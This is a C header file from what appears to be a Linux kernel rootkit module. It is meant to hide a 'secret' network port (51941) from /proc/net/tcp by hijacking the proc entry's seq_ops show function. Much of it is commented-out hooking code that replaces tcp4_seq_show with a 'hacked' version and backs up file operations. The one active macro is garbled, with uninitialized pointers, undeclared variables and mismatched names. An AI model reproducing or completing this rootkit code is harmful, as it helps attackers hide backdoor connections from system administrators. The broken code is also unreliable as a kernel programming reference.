#ifndef HIDE_PROC_NET_H
#define HIDE_PROC_NET_H
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <linux/sched.h>
#include <linux/kmod.h>
#include "seq.h"
#define SECREAT_PORT "51941"

//static struct inode *proc_inode;
//static struct file_operations *backup_fops;
//static struct file_operations proc_fops;
/*struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;					/* use count */
//		atomic_t in_use;				/* number of callers into module in progress; */							/* negative -> it's going away RSN */
//		struct completion *pde_unload_completion;
//		struct list_head pde_openers;	/* who did ->open, but not ->release */
//		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
//		u8 namelen;
//		char name[];
//};
//int origin_show(struct seq_file *seq, void *v );
/*int set_seq_op(char *op, char * path, int (*f_new)(struct seq_file *seq_f, void *v))
{
    struct path *p;
    static const struct inode *f_inode , backup_inode;
    static struct proc_inodes *p_inode;
    static struct proc_dir_entry *prc_dir;
    if (kern_path(path, 0, p))
        return 0;
    f_inode = p->dentry->d_inode;

    //prc_dir = PDE(f_inode)->seq_ops.op = f_new;
    p_inode = PROC_I(f_inode);
    (struct proc_dir_entry*)prc_dir->seq_ops.op = f_new;


    
}*/
/*
static void netstat_hook(void)
{
    struct rb_root proc_rb_root;
    struct rb_node *proc_rb_last, *proc_rb_nodeptr;
    struct tcp_seq_afinfo *tcp_seq;
    struct udp_seq_afinfo *udp_seq;
    struct proc_dir_entry *entry_ptr;
    proc_rb_root =  init_net.proc_net->subdir;
    proc_rb_last = rb_last(&proc_rb_root);
    proc_rb_nodeptr = rb_first(&proc_rb_root);
    while (proc_rb_nodeptr != proc_rb_last)
    {
        entry_ptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
    }

}
*/
/*
static void b(void)
{
    struct path p;
    printk(KERN_ALERT "rk: LKM loaded!");
    if(kern_path("/proc/net/tcp", 0, &p))
        return 0;
    //get the inode
    proc_inode = p.dentry->d_inode;
    //get a copy of fop from inode

    proc_fops = *proc_inode->i_fop;
    //backup the fop
    backup_fops = proc_inode->i_fop;
    //modify the copy with out evil func (the hyjcking)
    
    return 1;
}

//void a(void){
  //  struct proc_dir_entry *tcp = init_net.proc_net->subdir->next;
    /* starting tcp hook */
    //while (strcmp(tcp->name, "tcp") &&
//    (tcp != init_net.proc_net->subdir))
//    tcp = tcp->next;
//    if (tcp != init_net.proc_net->subdir) {
    /* save it */
//    __tcp4_seq_show =
//    ((struct tcp_seq_afinfo *)(tcp->data))->seq_ops.show;
    /* hijack */
//    ((struct tcp_seq_afinfo *)(tcp->data))->seq_ops.show =
//    hacked_tcp4_seq_show;
//    }
//}

//this macro  that set seq opertions to given file (by his path)
//op is the opertions
//path is the path to the spefic file
// 
 #define set_afinfo_seq_op(op, path, afinfo_struct, f_new, old)\
 {                                                              \
    struct path *p;                                              \
    struct inode f_inode, backup_inode;                           \
    kern_path(path, 0, p);                                         \
    af_info = PDE(p->dentry->d_inode);                              \
    old = af_info->seq_ops;                                       \
    afinfo->seq_ops = seq_ops;                                       \
 }                                                                     \
    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, ct_seq_show, origin_seq_show);                                                          
    
#endif